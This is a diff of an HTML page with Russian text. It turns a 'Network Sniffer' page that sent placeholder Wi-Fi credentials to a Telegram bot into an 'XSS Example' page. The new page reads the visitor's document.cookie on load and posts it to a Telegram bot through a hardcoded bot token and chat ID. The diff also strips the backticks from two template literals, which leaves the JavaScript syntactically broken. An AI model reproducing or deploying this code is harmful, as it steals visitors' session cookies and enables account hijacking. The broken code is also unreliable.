@@ -1,13 +1,21 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Network Sniffer</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Example</title>
+</head>
+<body>
+    <h1>Добро пожаловать на сайт!</h1>
+    <p>Ваши данные будут отправлены в Telegram.</p>
+
     <script>
         // Функция для отправки сообщения в Telegram
         function sendToTelegram(message) {
             const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
             const chatId = '7406507427';
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const url = https://api.telegram.org/bot${botToken}/sendMessage;
             const data = {
                 chat_id: chatId,
                 text: message
@@ -29,25 +37,11 @@
             });
         }
 
-        // Функция для сбора SSID и пароля
-        function collectData() {
-            // Пример данных (фактически сбор SSID и паролей невозможен из браузера)
-            const ssid = 'ExampleSSID';
-            const password = 'ExamplePassword';
-            const message = `SSID: ${ssid}\nPassword: ${password}`;
-            sendToTelegram(message);
-        }
+        // Получение cookies пользователя
+        const cookies = document.cookie;
 
-        window.onload = () => {
-            collectData();
-            setTimeout(() => {
-                window.close();  // Закрытие окна после небольшой задержки
-            }, 10000);  // Задержка 10 секунд
-        }
+        // Отправка cookies в Telegram
+        sendToTelegram(Cookies: ${cookies});
     </script>
-</head>
-<body>
-    <h1>Network Sniffer</h1>
-    <p>Сбор данных...</p>
 </body>
 </html>
